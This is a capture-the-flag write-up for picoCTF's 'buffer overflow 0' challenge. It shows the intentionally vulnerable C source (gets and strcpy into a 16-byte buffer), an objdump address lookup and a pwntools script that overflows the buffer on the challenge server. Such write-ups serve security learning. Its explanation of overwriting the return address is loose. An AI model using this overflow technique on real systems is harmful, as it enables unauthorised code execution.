# buffer overflow 0

This challenge from [picoCTF] is a basic buffer overflow.

Looking at the code we can see that we will need to overflow a 16 bytes buffer, we will also add 8 bytes so we will change the return adress to `sigsegv_handler`.

```c
void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```

To get `sigsegv_handle` adress, we can use objdump:

```
❯ objdump -d vuln | grep sigsegv_handler
0000130d <sigsegv_handler>:
```

# Solve.py

```py
from pwn import *

payload = b'A' * (16+8) + p64(0x000130d)

r = remote('saturn.picoctf.net', 63520)

r.recvuntil('Input:')
r.sendline(payload)
r.interactive()
```